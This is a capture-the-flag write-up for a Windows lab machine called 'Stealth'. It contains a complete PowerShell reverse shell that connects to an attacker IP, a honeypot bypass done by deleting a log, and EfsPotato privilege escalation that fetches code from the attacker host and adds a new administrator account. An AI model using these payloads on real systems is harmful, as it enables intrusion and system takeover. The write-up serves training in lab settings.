# Stealth

## Machine Info





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.8.5 -oN port_scan.txt

Nmap scan report for 10.10.8.5
Host is up (0.040s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-05T12:35:28+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-05T12:34:48+00:00
| ssl-cert: Subject: commonName=HostEvasion
| Not valid before: 2025-08-04T12:31:38
|_Not valid after:  2026-02-03T12:31:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
8000/tcp  open  http          PHP cli server 5.5 or later
|_http-title: 404 Not Found
8080/tcp  open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC

```



## Web Enumeration

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Try to upload a ps1 with a reverse shell to understand what is blocked and what not.

<details>

<summary>ps1 payload</summary>

```powershell
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.23.52.142', 13337)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close

```

</details>

```bash
penelope
m
listeners add -i tun0 -p 13337
```

We got a shell without anything restrictions

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Looking inside the evader's desktop we can view this file:

```powershell
SHELL> more encodedflag
-----BEGIN CERTIFICATE-----
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=
-----END CERTIFICATE-----


```

Decode this from base64 we obtain this:

{% code overflow="wrap" %}
```bash
echo "WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA=" | base64 -d                             

You can get the flag by visiting the link http://10.10.8.5:8000/asdasdadasdjakjdnsdfsdfs.php                                                                                                                    
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

The file is a HoneyPot, try to follow the hint.

Go to Xampp uploads directory in the htdocs

```
cd C:\xampp\htdocs\uploads
rm log.txt
```

And now refresh the web page.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

We got the user flag.



## PrivEsc

WinPEAS was blocked by AV. We can try others script but we not found any interesting thing.

### p0wny shell

Uploading the more stable shell like p0wny shell we notice that we are more privilges

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>



### EFS potato

{% embed url="https://github.com/zcgonvh/EfsPotato" %}

{% code overflow="wrap" %}
```
wget https://raw.githubusercontent.com/zcgonvh/EfsPotato/refs/heads/master/EfsPotato.cs

python3 -m http.server 80
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
curl http://10.23.52.142/EfsPotato.cs -o EfsPotato.cs

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618

EfsPotato.exe whoami

# add new user in the administrators group
EfsPotato.exe "cmd.exe /c net user Antoadmin Password123! /add && net localgroup Administrators Antoadmin /add"
```
{% endcode %}



### RDP Access

```
xfreerdp3 /v:IP /u:Antoadmin /p:'Password123!'
```

